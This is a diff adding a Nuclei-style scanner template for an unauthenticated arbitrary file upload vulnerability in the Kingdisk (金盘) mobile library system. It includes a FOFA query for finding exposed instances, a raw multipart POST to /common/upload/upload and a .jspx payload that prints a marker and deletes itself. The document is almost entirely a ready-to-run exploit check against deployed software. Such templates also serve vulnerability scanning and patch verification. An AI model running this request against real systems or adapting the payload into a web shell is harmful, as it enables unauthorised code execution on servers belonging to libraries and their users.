@@ -1,0 +1,38 @@
+id: kingdisk-file-upload
+
+info:
+  name: "金盘移动图书馆系统 upload 接口任意文件上传漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="金盘软件-金盘移动图书馆系统"
+      该系统存在未经充分验证的文件上传接口，攻击者可通过构造恶意请求在未授权情况下上传任意类型文件。成功利用可导致远程代码执行或敏感数据泄露，系统未对上传文件扩展名及内容进行有效校验。此漏洞影响所有未应用安全补丁的部署实例。
+  tags: 金盘移动图书馆系统
+
+http:
+- raw:
+  - |
+    POST /common/upload/upload HTTP/1.1
+    Host: {{Hostname}}
+    Cache-Control: max-age=0
+    Upgrade-Insecure-Requests: 1
+    Content-Type: multipart/form-data; boundary=399e563f0389566bd40fd4d6409a67dd
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
+    Cookie: JSESSIONID=D8C7BD39FAF4DD095FBBB0E87FB017C5
+    Connection: close
+
+    --399e563f0389566bd40fd4d6409a67dd
+    Content-Disposition: form-data; name="file"; filename="NTest.jspx"
+
+    <% out.println("NdayTest"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+    --399e563f0389566bd40fd4d6409a67dd--
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
